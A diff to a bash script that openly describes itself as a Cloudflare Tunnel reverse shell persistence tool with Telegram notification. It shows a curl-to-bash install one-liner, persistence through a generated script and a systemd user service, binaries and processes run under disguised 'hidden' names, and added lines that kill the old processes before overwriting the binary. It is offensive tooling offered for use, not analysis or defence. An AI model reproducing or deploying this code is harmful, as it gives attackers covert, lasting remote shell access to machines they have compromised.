@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# Cloudflare Tunnel Reverse Shell Persistence (like gsocket) + Telegram Notification
+# Cloudflare Tunnel Reverse Shell Persistence + Telegram
 # Usage: bash -c "$(curl -fsSL https://domain/path/deploy.sh)"
 # Uninstall: GS_UNDO=1 bash -c "$(curl -fsSL https://domain/path/deploy.sh)"
 
@@ -119,9 +119,9 @@ start_tunnel() {
 install_persistence() {
     local bin_path="$1"
     local port="$2"
-    local script_path="${HOME}/.${CONFIG_DIR}/cf_tunnel.sh"
+    local script_path="${HOME}/${CONFIG_DIR}/cf_tunnel.sh"
     local service_name="cf-tunnel"
-    mkdir -p "${HOME}/.${CONFIG_DIR}"
+    mkdir -p "${HOME}/${CONFIG_DIR}"
     cat > "$script_path" <<EOF
 #!/bin/bash
 # Persistence script for Cloudflare Tunnel (hidden as ${PROC_HIDDEN_NAME})
@@ -199,7 +199,7 @@ uninstall() {
         systemctl --user disable cf-tunnel.service 2>/dev/null || true
         rm -f "${HOME}/.config/systemd/user/cf-tunnel.service"
     fi
-    rm -rf "${HOME}/.${CONFIG_DIR}"
+    rm -rf "${HOME}/${CONFIG_DIR}"
     rm -rf "$TMPDIR"
     info "Uninstall complete."
     exit 0
@@ -214,8 +214,14 @@ mkdir -p "$TMPDIR"
 arch=$(detect_arch)
 cf_bin=$(download_cloudflared "$arch")
 
-INSTALL_DIR="${HOME}/.${CONFIG_DIR}"
+INSTALL_DIR="${HOME}/${CONFIG_DIR}"
 mkdir -p "$INSTALL_DIR"
+
+# Hentikan proses lama agar binary bisa ditimpa
+pkill -f "$BIN_HIDDEN_NAME" 2>/dev/null || true
+pkill -f "$PROC_HIDDEN_NAME" 2>/dev/null || true
+sleep 1
+
 cp "$cf_bin" "$INSTALL_DIR/$BIN_HIDDEN_NAME"
 chmod 755 "$INSTALL_DIR/$BIN_HIDDEN_NAME"
 cf_bin="$INSTALL_DIR/$BIN_HIDDEN_NAME"
